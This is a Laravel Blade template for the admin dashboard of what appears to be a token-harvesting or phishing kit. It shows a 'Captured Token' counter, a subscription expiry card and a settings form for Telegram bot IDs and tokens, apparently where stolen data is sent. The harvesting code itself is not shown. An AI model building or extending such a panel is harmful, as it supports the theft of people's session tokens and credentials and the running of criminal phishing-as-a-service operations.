@extends('layouts.admin')

@section('content')

<style>
    /* ====== HACKER / DARK MODE THEME ====== */
    body {
        background: #0d0d0d !important;
        color: #c6ffdd !important;
        font-family: "Consolas", "Courier New", monospace;
    }

    .hacker-card {
        background: rgba(0, 0, 0, 0.8);
        border: 1px solid #0aff0a55;
        border-radius: 8px;
        padding: 20px;
        margin-top: 25px;
        box-shadow: 0 0 15px #0aff0a33;
    }

    .hacker-title {
        font-size: 20px;
        font-weight: 700;
        color: #00ff95;
        border-bottom: 1px solid #00ff9555;
        padding-bottom: 6px;
        margin-bottom: 15px;
    }

    .glow-box {
        padding: 20px;
        border-radius: 8px;
        color: #fff;
        font-size: 22px;
        font-weight: 700;
        text-shadow: 0 0 8px #000;
        position: relative;
        overflow: hidden;
    }

    .glow-box i {
        position: absolute;
        right: 15px;
        top: 15px;
        font-size: 45px;
        opacity: 0.3;
    }

    .glow-green { background: linear-gradient(135deg, #003300, #00aa00); box-shadow: 0 0 15px #00ff0066; }
    .glow-red   { background: linear-gradient(135deg, #330000, #aa0000); box-shadow: 0 0 15px #ff000066; }
    .glow-blue  { background: linear-gradient(135deg, #001133, #0055aa); box-shadow: 0 0 15px #00aaff66; }

    .tg-row {
        padding: 14px 18px;
        margin-bottom: 8px;
        background: rgba(255,255,255,0.03);
        border-left: 3px solid #00ff99;
        border-radius: 5px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        color: #c6ffdd;
    }

    .btn-hacker {
        background: #00ff95;
        border: none;
        padding: 6px 14px;
        color: #000;
        font-weight: 700;
        border-radius: 4px;
        text-shadow: none;
    }
    .btn-hacker:hover {
        background: #00ffaa;
        box-shadow: 0 0 10px #00ff95;
    }
.clickable-box {
    cursor: pointer;
    transition: transform .2s ease, box-shadow .2s ease;
}

.clickable-box:hover {
    transform: translateY(-5px);
    box-shadow: 0 0 25px #00ffccaa !important;
}
</style>


<div class="container-fluid">

   <div class="row">

    <div class="col-lg-4 col-12">
        <a href="/tokens" class="text-decoration-none">
            <div class="glow-box glow-green clickable-box">
                {{ $validVisitors }} <br>
                <span style="font-size:15px;">Captured Token</span>
                <i class="fas fa-user-check"></i>
            </div>
        </a>
    </div>





</div>


@php
$isActive = now()->lte($settings->subscription_until);
@endphp

<div class="hacker-card">
    <div class="hacker-title">Subscription Status</div>

    <p><strong>Status:</strong>
        <span class="{{ $status == 'Active' ? 'text-success' : 'text-danger' }}">
            {{ $status }}
        </span>
    </p>

    <p><strong>Valid Until:</strong>
        <span style="color:#00eaff;">2025-12-31</span>
    </p>

</div>
</div>


</div>

<div class="modal fade" id="editSettingsModal" tabindex="-1">
    <div class="modal-dialog modal-lg">
        <form method="POST" action="#">
            @csrf

            <div class="modal-content" style="background:#0d0d0d; color:#00ff9c;">
                <div class="modal-header">
                    <h4 class="modal-title">Edit Telegram Settings</h4>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"
                        style="filter: invert(1);"></button>
                </div>

                <div class="modal-body">

                    <label class="form-label">Telegram ID 1</label>
                    <input type="text" name="telegram_id_1" class="form-control"
                        value="{{ $settings->telegram_id_1 }}">

                    <label class="form-label mt-3">Telegram Bot 1</label>
                    <input type="text" name="telegram_bot_1" class="form-control"
                        value="{{ $settings->telegram_bot_1 }}">

                    <label class="form-label mt-3">Telegram ID 2</label>
                    <input type="text" name="telegram_id_2" class="form-control"
                        value="{{ $settings->telegram_id_2 }}">

                    <label class="form-label mt-3">Telegram Bot 2</label>
                    <input type="text" name="telegram_bot_2" class="form-control"
                        value="{{ $settings->telegram_bot_2 }}">

                    <label class="form-label mt-3">Login Key</label>
                    <input type="text" name="login_key" class="form-control"
                        value="{{ $login_key }}">
                </div>

                <div class="modal-footer">
                    <button type="button" data-bs-dismiss="modal" class="btn btn-secondary">
                        Close
                    </button>
                    <button type="submit" class="btn btn-success">
                        Save Changes
                    </button>
                </div>
            </div>

        </form>
    </div>
</div>

<script>
function copyLink() {
  var copyText = "haha"
  navigator.clipboard.writeText(copyText);
  alert("Copied the text: " + copyText);
}
</script>

@endsection